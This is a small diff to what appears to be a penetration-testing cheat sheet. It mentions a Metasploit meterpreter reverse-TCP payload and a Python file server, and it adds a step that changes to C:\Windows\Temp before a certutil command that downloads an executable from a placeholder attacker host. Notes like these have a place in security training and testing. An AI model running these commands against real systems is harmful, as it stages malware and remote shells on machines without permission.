@@ -12,6 +12,7 @@ set payload windows/meterpreter/reverse_tcp
 ```
 python3 -m http.server
 
+cd C:\Windows\Temp
 certutil --urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
 ```
 # Metasploit Windows suggester
